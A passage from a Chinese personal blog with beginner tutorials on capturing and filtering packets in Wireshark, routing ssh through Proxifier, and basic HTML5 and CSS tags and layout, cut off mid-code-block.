-  <time class="dt-published" datetime="2023-12-17T11:39:56.000Z" itemprop="datePublished">2023-12-17</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2023/12/17/WireShark%E7%9A%84%E4%BD%BF%E7%94%A8/">WireShark的使用</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="WireShark的使用"><a href="#WireShark的使用" class="headerlink" title="WireShark的使用"></a>WireShark的使用</h1><h4 id="一丶WireShark的使用"><a href="#一丶WireShark的使用" class="headerlink" title="一丶WireShark的使用"></a>一丶WireShark的使用</h4><h3 id="网络分析工具WireShark的使用"><a href="#网络分析工具WireShark的使用" class="headerlink" title="网络分析工具WireShark的使用"></a>网络分析工具WireShark的使用</h3><p>WireShark是非常流行的网络封包分析工具，可以截取各种网络数据包，并显示数据包详细信息。常用于开发测试过程中各种问题定位</p>
-<p>WireShark软件安装软件下载路径：<a target="_blank" rel="noopener" href="https://www.wireshark.org/">wireshark官网</a>。按照系统版本选择下载</p>
-<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312171949551.png" alt="image-20231205200833803"></p>
-<p>管理员身份运行</p>
-<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312171950382.png" alt="image-20231205200945972"></p>
-<p>选择对应的网卡，右键，会出现Start Capture(开始捕获)，点击即可进行捕获该网络信息，开始抓取网络包</p>
-<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312171950934.png" alt="image-20231205201224375"></p>
-<p>执行需要抓包的操作，如ping <a target="_blank" rel="noopener" href="http://www.baidu.com./">www.baidu.com。</a></p>
-<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312171951186.png" alt="image-20231205201403018"></p>
-<p>操作完成后相关数据包就抓取到了。为避免其他无用的数据包影响分析，可以通过在过滤栏设置过滤条件进行数据包列表过滤</p>
-<p>ping操作属于icmp</p>
-<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312171952085.png" alt="image-20231205201529669"></p>
-<p>wireshark抓包完成</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2023/12/17/WireShark%E7%9A%84%E4%BD%BF%E7%94%A8/" data-id="clr4slxw80006qofnb4s407nt" data-title="WireShark的使用" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-proxifier软件的使用" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2023/12/10/proxifier%E8%BD%AF%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/" class="article-date">
-  <time class="dt-published" datetime="2023-12-10T03:53:17.000Z" itemprop="datePublished">2023-12-10</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2023/12/10/proxifier%E8%BD%AF%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/">proxifier软件的使用</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h3 id="proxifier软件的使用"><a href="#proxifier软件的使用" class="headerlink" title="proxifier软件的使用"></a>proxifier软件的使用</h3><p>下载proxifier压缩文件，打开猫的局域网连接，打开proxifier,点击配置文件</p>
-<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312101154905.png" alt="image-20231210115410697"></p>
-<p>点击编辑，如图设置，点击确定（ssh*;表示打开所有ssh开头的文件</p>
-<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312101155504.png" alt="image-20231210115526200"></p>
-<p>移除第一行，将default改为direct放行</p>
-<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312101155608.png" alt="image-20231210115547056"></p>
-<p>重启proxifier，win+r，输入cmd，在命令行中输入ssh <a href="mailto:root@1.1.1.1">root@1.1.1.1</a>，会在proxifier出现记录（大概率访问失败）</p>
-<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312101156128.png" alt="image-20231210115623540"></p>
-<h4 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h4><p>(1) Frame: 物理层的数据顿概况<br>(2) Ethernet ll:数据链路层以太网顿头部信息<br>(3) Internet Protocol Version 4: 互联网层IP包头部信息<br>(4) Transmission Control Protocol: 传输层T的数据段头部信息，此外是TCP(5) Hypertext Transfer Protocol: 应用层的信息，此外是HTTP协议</p>
-<p>协议过滤<br>比较简单，直接在Filter框中直接输入协议名即可。注意: 协议名称需要输入小写<br>tcp，只显示TCP协议的数据包列表<br>http，只查看HTTP协议的数据包列表<br>icmp，只显示ICMP协议的数据包列表</p>
-<p> ip过滤<br>ip.src &#x3D;&#x3D;192.168.1.104 显示源地址为192.168.1.104的数据包列表</p>
-<p>ip.dst&#x3D;&#x3D;192.168.1.104,显示目标地址为192.168.1.104的数据包列表</p>
-<p>ip.addr &#x3D;&#x3D; 192.168.1.104 显示源IP地址或目标IP地址为192.168.1.104的数据包列表</p>
-<p>tcp.port &#x3D;&#x3D;80,显示源主机或者目的主机端口为80的数据包列表。<br>tcp.srcport &#x3D;&#x3D; 80,只显示TCP协议的源主机端口为80的数据包列表<br>tcp.dstport &#x3D;&#x3D; 80，只显示TCP协议的目的主机端口为80的数据包列表</p>
-<p> Http模式过滤<br>http.request.method&#x3D;&#x3D;”GET”，只显示HTTP GET方法的</p>
-<ul>
-<li>源ip过滤： ip.src &#x3D;&#x3D; 源ip地址</li>
-<li>目的ip过滤 ： ip.dst &#x3D;&#x3D; 目的ip地址</li>
-<li>DNS一般在78左右，50-130</li>
-<li>下图红框所表示的意思：排序   时间戳  源Ip 目的ip   协议  DNS大小  数据包的简要信息</li>
-<li><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312101157393.png" alt="image-20231210115700380"></li>
-</ul>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2023/12/10/proxifier%E8%BD%AF%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/" data-id="clr4slxwb000bqofner62fbex" data-title="proxifier软件的使用" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-html5" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2023/12/10/html5/" class="article-date">
-  <time class="dt-published" datetime="2023-12-10T03:28:20.000Z" itemprop="datePublished">2023-12-10</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2023/12/10/html5/">html5</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h3 id="HTML5基础"><a href="#HTML5基础" class="headerlink" title="HTML5基础"></a>HTML5基础</h3><h5 id="在VS-code中添加拓展，如图所示"><a href="#在VS-code中添加拓展，如图所示" class="headerlink" title="在VS code中添加拓展，如图所示"></a>在VS code中添加拓展，如图所示</h5><p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312101131901.png" alt="image-20231210113109348"></p>
-<h6 id="创建一个html文件以便于对html有一个简单的认识"><a href="#创建一个html文件以便于对html有一个简单的认识" class="headerlink" title="创建一个html文件以便于对html有一个简单的认识"></a>创建一个html文件以便于对html有一个简单的认识</h6><p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312101133092.png" alt="image-20231206141148150"></p>
-<h5 id="进入输入指令”-TAB”则会自动输出基本的框架"><a href="#进入输入指令”-TAB”则会自动输出基本的框架" class="headerlink" title="进入输入指令”!+TAB”则会自动输出基本的框架"></a>进入输入指令”!+TAB”则会自动输出基本的框架</h5><p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312101134521.png" alt="image-20231206141423506"></p>
-<h4 id="HTML的基本语法："><a href="#HTML的基本语法：" class="headerlink" title="HTML的基本语法："></a>HTML的基本语法：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">html</span><br><span class="line">&lt;b&gt;:加粗&lt;/b&gt;</span><br><span class="line">&lt;i&gt;:斜体&lt;/i&gt;</span><br><span class="line">&lt;sup&gt;上标&lt;/sup&gt;</span><br><span class="line">    &lt;br /&gt;   &lt;!----换行--&gt;</span><br><span class="line">    &lt;b&gt;:加粗&lt;/b&gt;</span><br><span class="line">    &lt;sub&gt;下标&lt;/sub&gt;</span><br><span class="line">    &lt;hr /&gt;&lt;!----分割线--&gt;</span><br><span class="line">    &lt;strong&gt;加粗&lt;/strong&gt;&lt;!----注释--&gt;</span><br><span class="line">    &lt;em&gt;斜体&lt;/em&gt;</span><br><span class="line">    &lt;h1&gt;最大标题&lt;/h1&gt;</span><br><span class="line">    &lt;h6&gt;最小标题&lt;/h6&gt;</span><br><span class="line">    &lt;s&gt;文字中划线&lt;/s&gt;</span><br><span class="line">    &lt;del&gt;文字中划线&lt;/del&gt;</span><br><span class="line">    &lt;br /&gt;</span><br><span class="line">    &lt;a href=&quot;http://www.google.com&quot;&gt;google &lt;/a&gt;</span><br><span class="line">    &lt;br /&gt;</span><br><span class="line">    &lt;img src=&quot;./1.jpg&quot; width=&quot;100&quot; height=&quot;100&quot; alt=&quot;1&quot; /&gt;</span><br><span class="line">    &lt;table &gt;&lt;!----列表--&gt;</span><br><span class="line">        &lt;tr&gt;&lt;!----行--&gt;</span><br><span class="line">            &lt;td&gt;1&lt;/td&gt;&lt;!----列--&gt;</span><br><span class="line">            &lt;td&gt;2&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;3&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;4&lt;/td&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h4 id="HTML使用标签-来设置超文本链接"><a href="#HTML使用标签-来设置超文本链接" class="headerlink" title="HTML使用标签 &lt;a&gt;来设置超文本链接"></a>HTML使用标签 <code>&lt;a&gt;</code>来设置超文本链接</h4><p>超链接可以是一个字，一个词，或者一组词，也可以是一幅图像，您可以点击这些内容来跳转到新的文档或者当前文档中的某个部分。当你把鼠标指针移动到网页中的某个链接上时，箭头会变为一只小手。</p>
-<p>在标签 <code>&lt;a&gt; </code>中使用了 <strong>href</strong> 属性来描述链接的地址。在链接之后的文本则是作为链接的显示文本。例如以上则显示为下图所示。</p>
-<p>注意：<code>&lt;a&gt; </code>标签中必须提供 href 属性或 name 属性。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;http://www.google.com&quot;&gt;google &lt;/a&gt;</span><br></pre></td></tr></table></figure>
-
-<h4 id="HTML图像：在-HTML-中，图像由-标签定义"><a href="#HTML图像：在-HTML-中，图像由-标签定义" class="headerlink" title="HTML图像：在 HTML 中，图像由&lt;img&gt; 标签定义"></a>HTML图像：在 HTML 中，图像由<code>&lt;img&gt; </code>标签定义</h4><p><code>&lt;img&gt; </code>是空标签，意思是说，它只包含属性，并且没有闭合标签。</p>
-<p>要在页面上显示图像，你需要使用源属性（src）。src 指 “source”。源属性的值是图像的 URL 地址。</p>
-<p>URL 指存储图像的位置。如果名为 “1.jpg” 的图像位于文件夹的  目录中，那么其 URL 为 “.&#x2F;1.jpg”</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;./1.jpg&quot; width=&quot;100&quot; height=&quot;100&quot; alt=&quot;1&quot; /&gt;</span><br></pre></td></tr></table></figure>
-
-<p>定义图像的语法是：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;url&quot; alt=&quot;some_text&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<h4 id="用html-css写一个页面"><a href="#用html-css写一个页面" class="headerlink" title="用html+css写一个页面"></a>用html+css写一个页面</h4><p>整体界面如下</p>
-<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312101142698.png" alt="image-20231210114210737"></p>
-<p>代码解释：</p>
-<h2 id="HTML-部分："><a href="#HTML-部分：" class="headerlink" title="HTML 部分："></a>HTML 部分：</h2><blockquote>
-<p><code>&lt;!DOCTYPE html&gt;</code>：这是文档类型声明，指定文档使用 HTML5 标准。<br><code>&lt;html lang=&quot;en&quot;&gt;</code>：HTML 文档的根元素，<code>lang=&quot;en&quot;</code> 属性定义页面语言为英语。<br><code>&lt;head&gt;</code>：头部部分包含关于文档的元信息。<br> <code>&lt;meta charset=&quot;UTF-8&quot;&gt;</code>：设置文档使用 UTF-8 字符编码，确保能正确显示各种字符。<br> <code>&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</code>：配置视口，确保适应移动设备的屏幕。<br> <code>&lt;title&gt;web2302&lt;/title&gt;</code>：定义页面标题为 “web2302”。<br> <code>&lt;style&gt;</code>：内联样式表，包含了对页面样式的定义。</p>
-</blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">  &lt;title&gt;web2302&lt;/title&gt;</span><br></pre></td></tr></table></figure>
-
-<h4 id="在-标签内："><a href="#在-标签内：" class="headerlink" title="在 &lt;style&gt; 标签内："></a>在 <code>&lt;style&gt;</code> 标签内：</h4><h5 id="body-规则：设置整个页面的样式。"><a href="#body-规则：设置整个页面的样式。" class="headerlink" title="body 规则：设置整个页面的样式。"></a><code>body</code> 规则：设置整个页面的样式。</h5> <center>
-
-<p>​                <img src="./logo.png" height="100px"></div></p>
-<p>​       </center>  图片居中</p>
-<p>v id&#x3D;”header” style&#x3D;”background-color:#1e00ff;”&gt;</p>
-<pre><code>        &lt;p style=&quot;display: inline;&quot;&gt;中国政府网      湖南省人大网        湖南省政协网 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;
-
-        &lt;p style=&quot;text-align: right; display: inline;&quot; &gt; 繁體中文 ENGLISH Français 日本語 한국어 政务邮箱 无障碍浏览&lt;/p&gt;
-</code></pre>
-<p>​      文字据左右上</p>
-<h3 id="container-规则：定义页面容器的样式。"><a href="#container-规则：定义页面容器的样式。" class="headerlink" title="container 规则：定义页面容器的样式。"></a><code>container</code> 规则：定义页面容器的样式。</h3><blockquote>
-<p><code>width: 500px;</code>：设置容器宽度为 500 像素。<br><code>margin:0 auto;</code>：通过设置左右外边距为自动，使容器水平居中。</p>
-</blockquote>
-<h3 id="header-规则：定义页头的样式。"><a href="#header-规则：定义页头的样式。" class="headerlink" title="header 规则：定义页头的样式。"></a><code>header</code> 规则：定义页头的样式。</h3><blockquote>
-<p><code>background-color: #FFA500;</code>：设置背景颜色为橙色。<br><code>color: #fff;</code>：设置文字颜色为白色。<br><code>padding: 10px;</code>：设置内边距为 10 像素。<br><code>text-align: center;</code>：文字居中。</p>
-</blockquote>
-<h3 id="menu-规则：定义菜单的样式。"><a href="#menu-规则：定义菜单的样式。" class="headerlink" title="menu 规则：定义菜单的样式。"></a><code>menu</code> 规则：定义菜单的样式。</h3><blockquote>
-<p><code>background-color: #FFD700;</code>：设置背景颜色为金色。<br><code>height:100px;</code>：设置高度为 100 像素。<br><code>width: 500px;</code>：设置宽度为 500 像素</p>
-</blockquote>
-<h3 id="content-规则：定义内容区域的样式。"><a href="#content-规则：定义内容区域的样式。" class="headerlink" title="content 规则：定义内容区域的样式。"></a><code>content</code> 规则：定义内容区域的样式。</h3><blockquote>
-<p><code>background-color: #EEEEEE;</code>：设置背景颜色为淡灰色。<br><code>height:100px;</code>：设置高度为 100 像素。<br><code>width: 500px;</code>：设置宽度为 500 像素。</p>
-</blockquote>
-<h3 id="ll-和-ll1-规则：定义内容区域内两个子元素的样式。"><a href="#ll-和-ll1-规则：定义内容区域内两个子元素的样式。" class="headerlink" title="#ll 和 #ll1 规则：定义内容区域内两个子元素的样式。"></a><code>#ll</code> 和 <code>#ll1</code> 规则：定义内容区域内两个子元素的样式。</h3><blockquote>
-<p><code>background-color: #a74949;</code> 和 <code>background-color: #49a781;</code>：设置不同的背景颜色。<br><code>height:50px;</code>：设置高度为 50 像素。<br><code>width: 500px;</code>：设置宽度为 500 像素</p>
-</blockquote>
-<h3 id="footer-规则：定义页脚的样式。"><a href="#footer-规则：定义页脚的样式。" class="headerlink" title="footer 规则：定义页脚的样式。"></a><code>footer</code> 规则：定义页脚的样式。</h3><blockquote>
-<p><code>background-color: #FFA500;</code>：设置背景颜色为橙色。<br><code>color: #fff;</code>：设置文字颜色为白色。<br><code>clear: both;</code>：清除两侧浮动元素影响，确保页脚位于容器底部。<br><code>text-align: center;</code>：文字居中。<br><code>padding: 10px;</code>：设置内边距为 10 像素。</p>
-</blockquote>
-<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312101145033.png" alt="image-20231210114526437"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;pre&gt;&lt;/pre&gt;预处理</span><br><span class="line">&lt;b&gt;加粗</span><br><span class="line">&lt;i&gt;斜体</span><br><span class="line">&lt;sup&gt;上标如指数</span><br><span class="line">&lt;sub&gt;下标</span><br><span class="line">&lt;br /&gt;换行</span><br><span class="line">&lt;hr /&gt;水平线</span><br><span class="line">&lt;strong&gt;加粗</span><br><span class="line">&lt;em&gt;强调表现为斜体</span><br><span class="line">&lt;blockquote&gt;标记表现为缩进，将&lt;p&gt;&lt;/p&gt;包围在内</span><br><span class="line">&lt;q&gt;标记两侧引号，IE不支持</span><br><span class="line">&lt;abbr&gt;</span><br><span class="line">&lt;cite&gt;引用表现为斜体，html5不可用于人名</span><br><span class="line">&lt;dfn&gt;定义</span><br><span class="line">&lt;address&gt;地址</span><br><span class="line">&lt;ins&gt;文字带有下划线</span><br><span class="line">&lt;del&gt;文字带有删除线</span><br><span class="line">&lt;s&gt;文字中下方有横线穿过</span><br><span class="line">&lt;h1&gt;----&lt;h6&gt;标题由大到小 </span><br></pre></td></tr></table></figure>
-
-<p>列表</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;o1&gt;有序列表，中间每段用&lt;1i&gt;&lt;/1i&gt;</span><br><span class="line">&lt;u1&gt;无序列表，中间每段用&lt;1i&gt;&lt;/1i&gt;</span><br><span class="line">&lt;d1&gt;定义列表，首尾用&lt;d1&gt;，标题用&lt;dt&gt;，解释说明用&lt;dd&gt; </span><br></pre></td></tr></table></figure>
-
-<p>链接</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">网页链接文本&lt;a href＝&quot;[http://www.baidu.com](#http://www.baidu.com)&quot;&gt;百度&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">email链接&lt;a href ＝&quot;mailto:[1210396142@qq.com](#1210396142@qq.com)&gt;孙邮箱&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">在新窗口中打开链接target&lt;a href=&quot;[http://www.baidu.com](#http://www.baidu.com)&quot;target＝&quot;_blank&quot;&gt;百度&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">&lt;a href =&quot;http:/www.baidu.com/&quot;&gt;百度&lt;/a&gt;</span><br></pre></td></tr></table></figure>
-
-<p>图像</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;img&gt;没有结束标签，向页面添加图片。</span><br><span class="line">src 图片地址 </span><br><span class="line">alt 图片说明</span><br><span class="line">title 图片简略说明</span><br><span class="line">height以像素为单位时指定图片高度</span><br><span class="line">width以像素为单位时指定图片宽度</span><br><span class="line">&lt;img src= &quot;&quot; alt=&quot;&quot; width=&quot;600&quot; height=&quot;&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;img /&gt;&lt;p&gt;&lt;/p&gt;文字在图片下面</span><br><span class="line">&lt;p&gt;&lt;img /&gt;文字&lt;/p&gt;文字与图片底部齐平</span><br><span class="line">&lt;p&gt;文字&lt;img /&gt;文字&lt;/p&gt;图在文字中间</span><br><span class="line">align=〃left〃文本环绕在图像的右边</span><br><span class="line">alight=&quot;right&quot;文本环绕在图像的左边</span><br><span class="line">=&quot;top&quot;周围文本第一行与图像的顶端对齐</span><br><span class="line">=&quot;middle&quot;第一行文字与图像中间对齐</span><br><span class="line">=&quot;bottom&quot;第一行文字与图像底部对齐</span><br><span class="line">&lt;figure&gt;&lt;img&gt;&lt;figcaption&gt;图片解释标签等等&lt;/figcaption&gt;&lt;/figure&gt;</span><br><span class="line">&lt;figcaption&gt;图像说明&lt;/figcaption&gt; </span><br></pre></td></tr></table></figure>
-
-<p>表格</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;table&gt;创建表格</span><br><span class="line">&lt;tr&gt;&lt;/tr&gt;每行开始</span><br><span class="line">&lt;td&gt;&lt;/td&gt;每个单元格内容</span><br><span class="line">&lt;th&gt;&lt;/th&gt;行列的标题</span><br><span class="line">&lt;td colspan=&quot;2&quot;&gt;这个名称跨两行</span><br><span class="line">&lt;/td&gt;&lt;td rowspan=&quot;2&quot;这个名称占两列</span><br><span class="line">&lt;/td&gt;&lt;thead&gt;表格标题&lt;/thead&gt;</span><br><span class="line">&lt;tbody&gt;表格主体&lt;/tbody&gt;</span><br><span class="line">&lt;tfoot&gt;表格的脚注font字体</span><br><span class="line">align＝〃center〃居中 </span><br></pre></td></tr></table></figure>
-
-<p>布局</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"> h1&#123;各种位置;</span><br><span class="line"> top: 0px;</span><br><span class="line"> left: 0px;</span><br><span class="line"> padding: 10</span><br><span class="line"> px;margin: 0</span><br><span class="line"> px;width:100％;</span><br><span class="line"> background-color:#efefef;&#125;</span><br><span class="line"> position:static 普通流</span><br><span class="line"> width: 450px 每450个像素就换行</span><br><span class="line">position:relative相对定位</span><br><span class="line">top: 10px;向下移动10个像素</span><br><span class="line">left: 100px 自左边距100像素开始</span><br><span class="line">position:absolute绝对定位</span><br><span class="line">position:fixed固定定位 一直显示在页面</span><br><span class="line">z - index:10;重叠元素 数字大的显示在上层</span><br><span class="line">float浮动元素 float: right;</span><br><span class="line">width: 275px;margin: 5px;外边距5像素</span><br><span class="line">margin:10px auto自动 居中</span><br><span class="line">padding: 5px;内容与边框之间的距离</span><br><span class="line">padding-top:20px;上内边距 </span><br><span class="line">padding-right:30px;右内边距 </span><br><span class="line">padding-bottom:30px;下内边距 </span><br><span class="line">padding-left:20px;左内边距 </span><br><span class="line">padding:1px四边统一内边距 </span><br><span class="line">padding:1px1px上下,左右内边距 </span><br><span class="line">padding:1px1px1px上,左右,下内边距 </span><br><span class="line">padding:1px1px1px1px上,右,下,左内边距</span><br><span class="line">.clear&#123;clear:left/right/both/none&#125;清除浮动</span><br><span class="line">border:1px(线1像素) solid #665544;&#125;</span><br><span class="line">1.none:表示没</span><br><span class="line">2.solid：表示单线</span><br><span class="line">3.double：表示双线 </span><br><span class="line">4.groove：表示凹槽 </span><br><span class="line">5.redge:表示皱纹 </span><br><span class="line">6.dotted:点线</span><br><span 